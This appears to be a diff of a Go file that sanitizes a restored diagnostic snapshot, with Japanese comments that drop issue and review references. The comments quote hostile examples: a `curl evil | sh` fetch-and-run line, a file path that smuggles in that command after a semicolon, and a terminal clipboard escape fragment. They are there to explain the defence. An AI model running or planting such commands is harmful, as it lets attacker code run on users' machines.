@@ -8,13 +8,12 @@ import (
 	"github.com/jiikko/dotfiles/src/termsafe"
 )
 
-// 保存した Report を読み戻すときの信頼境界 (issue 178)。
+// 保存した Report を読み戻すときの信頼境界。
 //
 // 🚨 glogx は doctor 画面の結果を `$XDG_CACHE_HOME/glog/doctor-snapshot.json` に保存し、
 // TTL 内の開き直しでそのまま復元する。このファイルは**一般ユーザー権限で書き換えられる**。
 // サービス節は `Commands` を「手で実行してください」と提示し、`Y` でクリップボードへ渡すので、
-// 保存された文字列をそのまま信じると **`curl evil | sh` をコピー経路に載せられる**
-// (issue 178 の敵対レビューが実際に再現した)。
+// 保存された文字列をそのまま信じると **`curl evil | sh` をコピー経路に載せられる**。
 //
 // 方針は「保存された派生データを信じず、作り直す」:
 //   - `Commands` は捨てて `manualCommands` で**再生成**する (Label / Domain / PlistPath から導出できる)
@@ -52,8 +51,8 @@ func SanitizeRestored(rep Report) Report {
 	}
 	for _, u := range rep.Undiagnosed {
 		// PlistPath は「plutil -p <path>」の形でコマンド行に出る。glogx 側で ShellQuote を通すが、
-		// **形が崩れているものはそもそも復元しない** (二重の防御。敵対レビュー 2026-09-03 で、
-		// ここが Finding と違って無検査なため `/tmp/x; curl evil | sh #` がそのまま画面に出た)
+		// **形が崩れているものはそもそも復元しない** (二重の防御。
+		// 無検査だと `/tmp/x; curl evil | sh #` がそのまま画面に出る)
 		if !validPlistPath(u.PlistPath) {
 			continue
 		}
@@ -61,7 +60,7 @@ func SanitizeRestored(rep Report) Report {
 		out.Undiagnosed = append(out.Undiagnosed, u)
 	}
 	out.DirErrs = cleanTexts(rep.DirErrs)
-	// 🚨 最後に**表示の関門**も通す (issue 228 の敵対レビュー 2026-09-04)。ここまでの検査は
+	// 🚨 最後に**表示の関門**も通す。ここまでの検査は
 	// `validPlistPath` が「絶対パス / Clean 済み / .plist で終わる」しか見ておらず、
 	// **PlistPath の制御文字は素通りしていた** (Label は labelRe が弾くが、パスは
 	// 「実在の plist 名に何が入るかは決められない」ので文字種を絞っていない)。
@@ -93,9 +92,9 @@ func validPlistPath(p string) bool {
 
 // cleanText は制御文字 (改行・ANSI エスケープ) を落として長さを切る。表示用の自由文に使う。
 //
-// 🚨 無害化そのものは termsafe に委ねる (issue 228)。以前はここで `unicode.IsPrint` を回して
-// いたが、それは「ESC を落として payload (`]52;c;…`) は本文として残す」形で、同じ判定を
-// glogx 側と 2 実装持っていた。**残るのは復元固有の関心 = 長さの上限**だけ。
+// 🚨無害化そのものは termsafe に委ねる。ここで `unicode.IsPrint` を回さない。
+// それは「ESC を落として payload (`]52;c;…`) は本文として残す」形で、同じ判定を
+// glogx 側と 2 実装持つことになる。**残るのは復元固有の関心 = 長さの上限**だけ。
 // タブは PlainLine がスペース 4 へ展開する (端末のタブストップと dispWidth の食い違いを作らない)。
 func cleanText(s string) string {
 	return termsafe.CutBytes(termsafe.PlainLine(s), maxRestoredText) // rune の境界で上限以下に切る
